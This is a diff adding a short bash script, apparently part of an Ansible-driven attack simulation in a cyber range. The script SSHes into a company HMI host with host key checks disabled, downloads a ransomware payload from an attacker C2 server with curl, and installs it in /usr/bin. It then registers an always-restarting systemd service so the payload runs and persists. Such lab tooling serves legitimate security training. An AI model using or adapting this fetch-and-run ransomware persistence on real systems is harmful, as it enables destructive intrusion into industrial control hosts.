@@ -1,0 +1,26 @@
+#!/bin/bash
+
+ssh -o StrictHostKeyChecking=no apdias@{{ hostvars[company_name + '_hmi'].ansible_default_ipv4.address }} <<'EOF'
+
+    curl http://{{ hostvars['attacker_1'].attacker_cc_metasploit_ip_lanturtle }}:{{ hostvars['attacker_1'].attacker_web_port }}/{{ hostvars['attacker_1'].ransomware_payload }} --output /tmp/{{ hostvars['attacker_1'].ransomware_payload }}
+    chmod +x /tmp/{{ hostvars['attacker_1'].ransomware_payload }}
+    sudo mv /tmp/{{ hostvars['attacker_1'].ransomware_payload }} /usr/bin/{{ hostvars['attacker_1'].ransomware_payload }}
+
+    sudo echo "[Unit]
+    Description={{ hostvars['attacker_1'].exploit_filename }} Starter
+
+    [Service]
+    Restart=always
+    RestartSec=5
+    ExecStart=/usr/bin/{{ hostvars['attacker_1'].ransomware_payload }}
+    User=%I
+
+    [Install]
+    WantedBy=multi-user.target" | sudo tee /etc/systemd/system/{{ hostvars['attacker_1'].exploit_filename }}@.service
+
+    sudo systemctl daemon-reload
+    sudo systemctl enable {{ hostvars['attacker_1'].exploit_filename }}@hmi.service
+    sudo systemctl start {{ hostvars['attacker_1'].exploit_filename }}@hmi.service
+    sudo systemctl restart {{ hostvars['attacker_1'].exploit_filename }}@hmi.service
+
+EOF
